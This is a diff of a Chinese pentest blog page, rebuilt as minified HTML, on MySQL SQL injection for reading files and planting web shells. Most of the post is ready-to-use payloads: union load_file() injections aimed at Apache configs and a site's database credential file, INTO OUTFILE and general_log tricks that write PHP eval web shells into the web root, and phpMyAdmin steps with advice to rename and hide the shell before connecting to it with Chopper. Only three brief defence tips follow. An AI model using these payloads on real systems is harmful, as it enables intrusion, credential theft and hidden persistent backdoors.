@@ -1,197 +1,54 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>SQL 注入之 load_file 和 into outfile(MySQL) | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>SQL 注入之 load_file 和 into outfile(MySQL)</h1>
-      
-<div class="post-meta">
-    <time>2016-06-20</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>,<a href="/tags/getshell">getshell</a>)
-</div>
-
-      <div><h3 id="0x00-load_file-读文件">0x00 load_file() 读文件</h3>
-<ul>
-<li>条件:</li>
-</ul>
-<pre tabindex="0"><code>1. 要有file_priv权限: show global variables like &#39;%secure%&#39;;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>SQL 注入之 load_file 和 into outfile(MySQL) | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>SQL 注入之 load_file 和 into outfile(MySQL)</h1><div class=post-meta><time>2016-06-20</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>,<a href=/tags/getshell>getshell</a>)</div><div><h3 id=0x00-load_file-读文件>0x00 load_file() 读文件</h3><ul><li>条件:</li></ul><pre tabindex=0><code>1. 要有file_priv权限: show global variables like &#39;%secure%&#39;;
 2. 知道文件绝对路径
 3. 能使用union
 4. 对web目录有读权限  
 注：若过滤了单引号，则可以将函数中的字符进行hex编码
-</code></pre><ul>
-<li>
-<p>一般步骤</p>
-<ul>
-<li>读/etc/init.d下的东西，这里有配置文件路径</li>
-</ul>
-<pre tabindex="0"><code>?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)
-</code></pre><ul>
-<li>得到web安装路径</li>
-</ul>
-<pre tabindex="0"><code>?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)
-</code></pre><ul>
-<li>读取密码文件</li>
-</ul>
-<pre tabindex="0"><code>?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)
-</code></pre></li>
-</ul>
-<h3 id="0x01-load-data-local-infile-读文件">0x01 load data local infile 读文件</h3>
-<ul>
-<li>条件:</li>
-</ul>
-<pre tabindex="0"><code>MySQL8 中需要 SET GLOBAL local_infile=1;
-</code></pre><ul>
-<li>语句</li>
-</ul>
-<pre tabindex="0"><code>LOAD DATA LOCAL INFILE &#39;D:/pet.txt&#39; INTO TABLE pet FIELDS TERMINATED BY &#39;&#39;;
+</code></pre><ul><li><p>一般步骤</p><ul><li>读/etc/init.d下的东西，这里有配置文件路径</li></ul><pre tabindex=0><code>?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)
+</code></pre><ul><li>得到web安装路径</li></ul><pre tabindex=0><code>?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)
+</code></pre><ul><li>读取密码文件</li></ul><pre tabindex=0><code>?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)
+</code></pre></li></ul><h3 id=0x01-load-data-local-infile-读文件>0x01 load data local infile 读文件</h3><ul><li>条件:</li></ul><pre tabindex=0><code>MySQL8 中需要 SET GLOBAL local_infile=1;
+</code></pre><ul><li>语句</li></ul><pre tabindex=0><code>LOAD DATA LOCAL INFILE &#39;D:/pet.txt&#39; INTO TABLE pet FIELDS TERMINATED BY &#39;&#39;;
 select * from pet;
-</code></pre><h3 id="0x02-into-outfile-getshell">0x02 into outfile getshell</h3>
-<ul>
-<li>条件：</li>
-</ul>
-<pre tabindex="0"><code>1. 要有file_priv权限  
+</code></pre><h3 id=0x02-into-outfile-getshell>0x02 into outfile getshell</h3><ul><li>条件：</li></ul><pre tabindex=0><code>1. 要有file_priv权限  
 2. 知道网站绝对路径  
 3. 要能用union  
 4. 对web目录有写权限  
 5. 没有过滤单引号
-</code></pre><ul>
-<li>一般方法<br>
-当知道路径时，可以直接用</li>
-</ul>
-<pre tabindex="0"><code>id=1 union select &#34;&lt;? phpinfo();&gt;&#34; into outfile(&#34;C:/phpStudy/WWW/a.php&#34;)
+</code></pre><ul><li>一般方法<br>当知道路径时，可以直接用</li></ul><pre tabindex=0><code>id=1 union select &#34;&lt;? phpinfo();&gt;&#34; into outfile(&#34;C:/phpStudy/WWW/a.php&#34;)
 
 id=1 into outfile &#39;C:/phpStudy/WWW/a.php&#39; columns terminated by &#39;&lt;? phpinfo();&gt;&#39;;
 id=1 into outfile &#39;C:/phpStudy/WWW/a.php&#39; fields terminated by &#39;&lt;? phpinfo();&gt;&#39;;
 id=1 into outfile &#39;C:/phpStudy/WWW/a.php&#39; lines terminated by &#39;&lt;? phpinfo();&gt;&#39;;
 id=1 into outfile &#39;C:/phpStudy/WWW/a.php&#39; lines starting by &#39;&lt;? phpinfo();&gt;&#39;;
-</code></pre><ul>
-<li>phpMyAdmin 导出数据 getshell</li>
-</ul>
-<p>登陆phpMyAdmin</p>
-<pre tabindex="0"><code>use test;  选择数据库为test
+</code></pre><ul><li>phpMyAdmin 导出数据 getshell</li></ul><p>登陆phpMyAdmin</p><pre tabindex=0><code>use test;  选择数据库为test
 create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
 insert into aaa values(&#34;&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;&#34;); --在 aaa 中写入 shell 内容
 select * from aaa into outfile &#39;C:/phpStudy/WWW/a.php&#39;; --将 aaa 中的数据导出到文件 a.php
-</code></pre><p>localhost:80/a.php能访问</p>
-<pre tabindex="0"><code>drop aaa; --删除建立的表
-</code></pre><p>然后菜刀连接</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php</span>
-</span></span></code></pre></div><ul>
-<li>phpMyAdmin 日志 getshell</li>
-</ul>
-<pre tabindex="0"><code>show variables like &#39;%general%&#39;;             #查看配置
+</code></pre><p>localhost:80/a.php能访问</p><pre tabindex=0><code>drop aaa; --删除建立的表
+</code></pre><p>然后菜刀连接</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php</span>
+</span></span></code></pre></div><ul><li>phpMyAdmin 日志 getshell</li></ul><pre tabindex=0><code>show variables like &#39;%general%&#39;;             #查看配置
 set global general_log = on;                 #开启general log模式
 set global general_log_file = &#39;C:/phpStudy/WWW/a.php&#39;; #设置日志目录为shell地址
 select &#39;&lt;?php eval($_GET[g]);?&gt;&#39;             #写入shell
 set global general_log=off;                  #关闭general log模式
-</code></pre><h3 id="0x03-防御">0x03 防御</h3>
-<ul>
-<li>数据库连接账号不要用root权限</li>
-<li>php关闭报错模式</li>
-<li>mysql账户没有权限向网站目录写文件</li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x03-防御>0x03 防御</h3><ul><li>数据库连接账号不要用root权限</li><li>php关闭报错模式</li><li>mysql账户没有权限向网站目录写文件</li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
